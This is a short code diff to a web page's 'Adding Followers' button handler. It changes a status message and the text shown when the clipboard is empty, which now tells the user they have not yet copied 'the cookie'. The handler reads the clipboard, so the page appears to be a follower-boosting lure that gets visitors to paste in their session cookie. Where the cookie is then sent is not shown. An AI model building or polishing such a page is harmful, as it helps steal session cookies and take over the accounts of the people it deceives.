@@ -225,13 +225,13 @@ button.addEventListener("click", async () => {
 
     status.innerHTML = `
       <span class="spinner"></span>
-      Adding Followers
+      Adding Followers...
     `;
 
     const text = await navigator.clipboard.readText();
 
     if (!text) {
-      status.textContent = "Your clipboard is empty.";
+      status.textContent = "You havent copy The cookie Yet.";
       return;
     }
 
